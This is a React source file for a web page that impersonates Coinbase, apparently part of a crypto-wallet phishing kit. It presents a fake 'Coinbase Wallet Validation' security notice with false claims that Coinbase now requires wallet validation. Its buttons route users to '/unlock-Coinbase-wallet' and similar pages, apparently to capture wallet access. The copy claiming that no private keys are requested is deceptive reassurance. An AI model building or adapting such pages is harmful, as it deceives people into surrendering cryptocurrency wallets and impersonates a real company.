import React, { useEffect } from 'react'
import "./coinbaseCss/landing.css"
import Header from '../header/Header'
import { useNavigate } from 'react-router-dom';
import coinbase_logo from '../../assets/coinbase_logo.png';
import landing_section1_image from '../../assets/landing_section1_image.svg';
import landing_section2_image from '../../assets/landing_section2_image.png';
import Footer from '../../component/header/footer/Footer';
import metamask_webwallet_img from '../../assets/meta2.svg'
import metamask_explore_img from '../../assets/meta3.svg'
import metamask_ownYourData_img from '../../assets/Meta4.svg'
import { motion } from "framer-motion";

const Landing = () => {

  const navigate = useNavigate()

  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://www.livecoinwatch.com/static/lcw-widget.js";
    script.defer = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <div className='landing_body'>
        <div className="home-widget">
          <div className="home-widget-wrapper">
            <div
              className="livecoinwatch-widget-5"
              lcw-base="USD"
              lcw-color-tx="#999999"
              lcw-marquee-1="coins"
              lcw-marquee-2="movers"
              lcw-marquee-items="10">
            </div>
          </div>
        </div>

        <Header/>

        {/* ================= HERO ================= */}
        <section className='landing_section1'>
          <motion.div
            initial={{ opacity: 0, y: 100 }}
            transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ margin: "-40px", once: true }}
            className='landing_section1_left'
          >
            <div className='landing_section1_left_top'>
              <div className='logo_and_text'>
                <img src={coinbase_logo} alt=''/>
                <p>SECURITY</p>
              </div>
              <h1>Coinbase Wallet Validation</h1>
            </div>

            <div className='landing_section1_left_middle'>
              <h3>Required security upgrade in progress</h3>

              <div className='landing_section1_left_middle_dotted_text_container'>
                <div className='dotted_icon'></div>
                <p>Confirm wallet ownership to maintain uninterrupted access</p>
              </div>

              <div className='landing_section1_left_middle_dotted_text_container'>
                <div className='dotted_icon'></div>
                <p>Apply upgraded security protocols to protect against unauthorized activity</p>
              </div>

              <div className='landing_section1_left_middle_dotted_text_container'>
                <div className='dotted_icon'></div>
                <p>Ensure compatibility with the latest Coinbase security infrastructure</p>
              </div>
            </div>

            <div className='landing_section1_left_button_container'>
              <button onClick={()=>navigate('/unlock-Coinbase-wallet')}>
                Validate Wallet
              </button>
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, x: 100 }}
            transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ margin: "-40px", once: true }}
            className='landing_section1_right'
          >
            <img src={landing_section1_image} alt='hero_img'/>
          </motion.div>
        </section>

        {/* ================= INFO ================= */}
        <section className='landing_section2'>
          <div className='landing_section2_top_container'>
            <div className='landing_section2_top_container_left'>
              <h1>Why wallet validation is necessary</h1>
            </div>
            <div className='landing_section2_top_container_right'>
              <p>
                As part of ongoing security improvements, Coinbase now requires
                wallet validation to confirm ownership, prevent fraud, and
                protect user assets across all supported networks.
              </p>
            </div>
          </div>

          <div className='landing_section2_bottom_container'>
            <img src={landing_section2_image} alt='image'/>
          </div>
        </section>

        {/* ================= SECURITY BLOCKS ================= */}
        <div className='landing_webwallet'>
          <div className="landing_webwallet_wrapper change_now">
            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              className="landing_webwallet_Text"
            >
              <h1>Secure wallet verification</h1>
              <p>
                Validation confirms that your wallet is legitimately connected
                to your account without exposing private keys or recovery phrases.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              src={metamask_webwallet_img}
              alt=""
              className='landing_webwallet_img'
            />
          </div>
        </div>

        <div className='landing_webwallet'>
          <div className="landing_webwallet_wrapper">
            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              className="landing_webwallet_Text two"
            >
              <h1>Protection against unauthorized access</h1>
              <p>
                Advanced monitoring systems require wallet confirmation to
                detect unusual activity and prevent unauthorized transactions.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              src={metamask_explore_img}
              alt=""
              className='landing_webwallet_img'
            />
          </div>
        </div>

        <div className='landing_webwallet'>
          <div className="landing_webwallet_wrapper change_now">
            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              className="landing_webwallet_Text"
            >
              <h1>Your data remains private</h1>
              <p>
                Coinbase does not request private keys or recovery phrases.
                Validation is performed using secure, read-only verification methods.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}
              src={metamask_ownYourData_img}
              alt=""
              className='landing_webwallet_img'
            />
          </div>
        </div>

        {/* ================= CTA ================= */}
        <div className='landing_getStarted'>
          <div className='landing_getStarted_img'>
            <img src={coinbase_logo} alt="" />
          </div>
          <h1>Complete Wallet Validation</h1>
          <button onClick={()=>navigate('/coinbase-wallet')}>
            Proceed to Validation
          </button>
        </div>

        <Footer/>
      </div>
    </>
  )
}

export default Landing
